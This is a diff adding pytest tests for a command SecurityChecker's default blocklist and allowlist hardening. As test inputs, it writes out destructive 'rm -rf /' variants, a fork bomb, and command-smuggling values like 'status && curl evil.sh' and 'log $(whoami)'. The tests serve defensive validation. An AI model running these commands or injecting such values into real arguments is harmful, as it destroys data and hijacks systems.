@@ -84,3 +84,73 @@ class TestSecurityChecker:
         truncated = checker.truncate_output(output)
         assert len(truncated) < len(output)
         assert "truncated" in truncated
+
+
+class TestDefaultBlocklist:
+    def _default_checker(self):
+        from cli_mcp.config import DEFAULT_CONFIG
+
+        return SecurityChecker(DEFAULT_CONFIG)
+
+    def test_rm_rf_root_blocked(self):
+        checker = self._default_checker()
+        for args in ["-rf /", "-rf / --no-preserve-root", "-fr /", "-r -f /", "-rf //"]:
+            try:
+                checker.validate("rm", args, 60)
+                assert False, f"'rm {args}' should have been blocked"
+            except SecurityError:
+                pass
+
+    def test_rm_rf_subdir_allowed(self):
+        checker = self._default_checker()
+        checker.validate("rm", "-rf ./tmp", 60)
+        checker.validate("rm", "-rf node_modules", 60)
+
+    def test_fork_bomb_blocked_mid_command(self):
+        checker = self._default_checker()
+        try:
+            checker.validate("bash", "-c 'cd /tmp && :(){ :|:& };:'", 60)
+            assert False, "fork bomb should have been blocked"
+        except SecurityError:
+            pass
+
+
+class TestAllowlistHardening:
+    def _checker(self):
+        return SecurityChecker({
+            "security": {
+                "mode": "allowlist",
+                "allowed_tools": ["git", "npm"],
+                "blocklist": [
+                    {"pattern": "--no-preserve-root", "reason": "test"},
+                ],
+            }
+        })
+
+    def test_shell_chaining_rejected(self):
+        checker = self._checker()
+        chained = [
+            "status; rm -rf /workspace",
+            "status && curl evil.sh",
+            "log | sh",
+            "log `whoami`",
+            "log $(whoami)",
+        ]
+        for args in chained:
+            try:
+                checker.validate("git", args, 60)
+                assert False, f"'git {args}' should have been rejected"
+            except SecurityError:
+                pass
+
+    def test_plain_args_allowed(self):
+        checker = self._checker()
+        checker.validate("git", "log --oneline -10", 60)
+
+    def test_blocklist_applies_in_allowlist_mode(self):
+        checker = self._checker()
+        try:
+            checker.validate("git", "clean --no-preserve-root", 60)
+            assert False, "blocklist should apply in allowlist mode"
+        except SecurityError:
+            pass
